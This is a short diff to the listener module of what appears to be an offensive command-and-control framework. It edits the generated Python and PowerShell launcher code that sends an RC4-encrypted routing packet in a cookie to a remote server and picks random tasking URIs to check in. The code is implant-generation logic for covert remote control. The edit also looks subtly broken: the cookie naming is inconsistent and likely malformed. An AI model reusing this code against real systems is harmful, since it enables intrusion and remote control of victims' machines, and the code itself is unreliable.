@@ -452,9 +452,8 @@ class Listener(object):
                 
                 launcherBase += "req=urllib2.Request(server+t);\n"
                 # add the RC4 packet to a cookie
-                launcherBase += "req.add_header('User-Agent',UA);\n"
-                launcherBase += "req.add_header('Cookie',\"%s=%s\");\n" % (cookie, b64RoutingPacket)
-                
+                launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (b64RoutingPacket)
+
                 # Add custom headers if any
                 if customHeaders != []:
                     for header in customHeaders:
@@ -769,7 +768,7 @@ class Listener(object):
                                 $script:Headers.GetEnumerator() | % {$""" + helpers.generate_random_script_var_name(
                     "wc") + """.Headers.Add($_.Name, $_.Value)}
                                 $""" + helpers.generate_random_script_var_name(
-                    "wc") + """.Headers.Add("Cookie",\"""" + self.session_cookie + """=$RoutingCookie")
+                    "wc") + """.Headers.Add("Cookie",\"""" + self.session_cookie + """session=$RoutingCookie")
 
                                 # choose a random valid URI for checkin
                                 $taskURI = $script:TaskURIs | Get-Random
